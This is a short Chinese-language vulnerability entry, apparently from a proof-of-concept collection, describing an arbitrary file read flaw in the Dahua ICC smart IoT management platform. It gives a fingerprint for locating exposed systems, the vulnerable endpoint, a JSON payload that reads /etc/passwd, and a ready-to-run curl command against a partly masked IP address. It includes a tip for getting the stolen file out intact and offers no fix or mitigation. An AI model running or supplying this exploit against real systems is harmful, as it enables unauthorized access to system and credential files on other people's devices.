# 大华ICC智能物联综合管理平台response_file存在任意文件读取漏洞

- **系统**：大华　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="static/qwebchannel.js"`
- **请求**：`POST /evo-runs/v1.0/receive/response/file HTTP/1.1`
- **关键头**：`Content-Type: application/json`

**请求体 / payload**
```
{"method":"agent.module.log.file","info":{"list":[{"fileName":"1.txt","path":"/etc/passwd","serverIp":"[127.0.0.1]"}]}}
读取到是个压缩包，yakit重放会损坏压缩包，建议使用linux服务器curl读取文件
curl -k -X POST "https://39.xx.xx.55:447/evo-runs/v1.0/receive/response/file" \
-H "Host: 39.xx.xx.55:447" \
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0" \
-H "Content-Type: application/json" \
-d '{"method":"agent.module.log.file","info":{"list":[{"fileName":"1.txt","path":"/etc/passwd","serverIp":"[127.0.0.1]"}]}}' \
-o response.zip
查看内容
```
- **预期**：200　|　—